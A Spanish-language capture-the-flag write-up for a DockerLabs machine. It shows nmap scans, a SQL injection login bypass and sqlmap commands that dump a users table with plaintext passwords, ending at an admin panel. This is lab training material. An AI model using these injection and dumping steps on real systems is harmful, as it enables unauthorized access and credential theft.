Propiedades:
- OS: Linuxx
- Plataforma: DockerLabs
- Nivel: 
- Tags:

![](../assets/Pasted image 20251105005855.png)

#### Reconocimiento

Comienzo con un escaneo con nmap para ver los puertos abiertos:
```bash
> sudo nmap -sS -p- --open -Pn -n -T5 --min-rate 5000 172.17.0.2 -oN ports.txt
-------------------------------------------------------------------------------
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 00:58 CST
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
- Puerto 80 y 22 abiertos

Realizamos un escaneo mas profundo para ver servicios y versiones:
```bash
> sudo nmap -sS -p 80,22 -sCV -Pn -n -T5 --min-rate 5000 172.17.0.2 -oN target.txt
----------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:9a:9f:b3:17:be:3d:2e:12:05:0f:a4:61:c3:b3:76 (ECDSA)
|_  256 69:8f:5c:4f:14:b0:4d:b6:b7:59:34:4d:b9:03:40:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: cs
MAC Address: 0A:10:F4:2F:DD:B3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Maquina Linux, en el puerto 80 corre un apache service



#### Enumeración

**Puerto 80 HTTP**
Es una pagina de un casino o algo asi, y tiene un tab de login:
![](../assets/Pasted image 20251105010447.png)

#### Explotación

Bypasse la tab de login con una _sqli_ 
![](../assets/Pasted image 20251105010533.png)

Lo cual me llevo a esta tab:
![](../assets/Pasted image 20251105010553.png)

Al parecer el login es vulnerable por lo que usamos `sqlmap` para dumpear todas las bases de datos
```bash
> sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users --tables
------------------------------------------------------------------------------
[01:29:53] [INFO] fetching database names
[01:29:53] [INFO] retrieved: 'mysql'
[01:29:53] [INFO] retrieved: 'information_schema'
[01:29:53] [INFO] retrieved: 'performance_schema'
[01:29:53] [INFO] retrieved: 'sys'
[01:29:53] [INFO] retrieved: 'users'
```

Ahora procedemos a dumpear las tablas de la base de datos _users_
```bash
> sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users --tables --batch
------------------------------------------------------------------------------------
[1 table]
+----------+
| usuarios |
+----------+
```

Procedemos a dumpear las columnas de esa tabla

```bash
> sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios --columns --batch
-------------------------------------------------------------------------------------------------
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int unsigned |
| password | varchar(50)  |
| username | varchar(50)  |
+----------+--------------+
```

Procedimos a dumpear la informacion
```bash
> sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios -C id,username,password --dump --batch
----------------------------------------------------------------------------------------------------------------------
[3 entries]
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
| 1  | lucas    | 123321123321         |
| 2  | santiago | 123456123456         |
| 3  | joe      | MiClaveEsInhackeable |
+----+----------+----------------------+
```

Me procedí a logear con el usuario _joe_ y me muestra un panel de administración